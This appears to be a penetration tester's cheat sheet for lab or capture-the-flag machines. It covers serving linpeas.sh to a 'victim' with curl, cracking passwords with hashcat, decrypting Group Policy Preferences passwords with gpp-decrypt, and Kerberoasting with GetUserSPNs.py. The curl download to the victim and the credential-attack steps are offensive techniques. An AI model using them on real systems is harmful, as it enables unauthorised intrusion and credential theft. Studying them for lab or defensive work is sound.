# How to transfer file from your machine to victim's?

1. Open http server using Python
```
python3 -m http.server 80
```
2. On victim's machine type:
```
curl -O http://10.10.14.24/linpeas.sh
```

# About finding passwords for users

- Use every wordlist and johntheripper/hashcat and try to find password

# About Group Policy Preferences

Group Policy Preferences (GPP) was introduced in Windows Server 2008, and among many other features,
allowed administrators to modify users and groups across their network.
An example use case is where a company’s gold image had a weak local administrator password, and
administrators wanted to retrospectively set it to something stronger. The defined password was AES-256
encrypted and stored in Groups.xml . However, at some point in 2012, Microsoft published the AES key on
MSDN, meaning that passwords set using GPP are now trivial to crack and considered low-hanging fruit.

![image](https://github.com/user-attachments/assets/ab5fcc0b-38ff-4d15-a5d7-674722884bd5)

### Example

We extract the encrypted password form the Groups.xml file and decrypt it using gpp-decrypt .

```
gpp-decrypt
edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18
```

# Fixing "Kerberos SessionError"

![image](https://github.com/user-attachments/assets/4585b5a6-d0dc-4cd3-8be0-4c1bebf6f18d)

1. If you are not currently running as the root user, switch to the root user by running the “su” command
2. Run “timedatectl set-ntp off” to disable the Network Time Protocol from auto-updating
3. Run “rdate -n [IP of Target]” to match your date and time with the date and time of the your target machine
4. Run your Kerberoast command (which should be GetUserSPNs.py [Domain Name].local/[username]:[password] -dc-ip [Domain Controller IP] -request)
